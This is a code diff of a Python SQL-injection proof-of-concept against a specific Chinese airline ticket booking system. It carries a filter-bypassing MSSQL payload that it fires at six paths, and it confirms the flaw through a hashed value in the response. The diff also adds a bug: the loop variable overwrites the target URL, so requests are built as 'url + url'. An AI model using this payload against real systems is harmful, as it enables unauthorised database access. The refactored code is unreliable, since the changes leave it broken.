@@ -9,14 +9,7 @@ description: multi sqli。
 import sys
 import requests
 import warnings
-  
-
-
-class six_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['票友机票预订系统6处SQL注入(绕过)','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -30,7 +23,7 @@ class six_sqli:
         try:
             noexist = True
             for url in urls:
-                vulnurl = self.url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
+                vulnurl = url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     result[2]=  '存在'
@@ -45,5 +38,5 @@ class six_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = six_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
